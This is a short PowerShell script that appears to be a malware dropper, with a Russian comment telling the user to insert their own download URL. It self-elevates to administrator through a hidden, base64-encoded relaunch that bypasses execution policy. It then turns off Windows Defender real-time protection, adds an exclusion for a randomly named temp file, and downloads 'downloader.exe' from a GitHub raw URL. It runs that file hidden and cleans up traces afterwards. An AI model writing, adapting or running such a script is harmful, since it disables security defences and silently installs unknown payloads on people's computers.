
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $script = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($MyInvocation.MyCommand.Definition))
    Start-Process powershell -Verb runAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $script"
    exit
}


try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } catch {}


$Url = "https://raw.githubusercontent.com/theteslabro/inastaller/main/downloader.exe" # Замени на свой сырой URL с GitHub

$RandomName = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_}) + ".exe"
$Output = "$env:TEMP\$RandomName"

try { Add-MpPreference -ExclusionPath $Output -ErrorAction SilentlyContinue } catch {}

try { Invoke-WebRequest -Uri $Url -OutFile $Output -ErrorAction Stop -UseBasicParsing } catch {}

try { Start-Process -FilePath $Output -WindowStyle Hidden -ErrorAction Stop } catch {}


try { Remove-Item $Output -Force -ErrorAction SilentlyContinue } catch {}
try { Remove-MpPreference -ExclusionPath $Output -ErrorAction SilentlyContinue } catch {}


try { Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue } catch {}
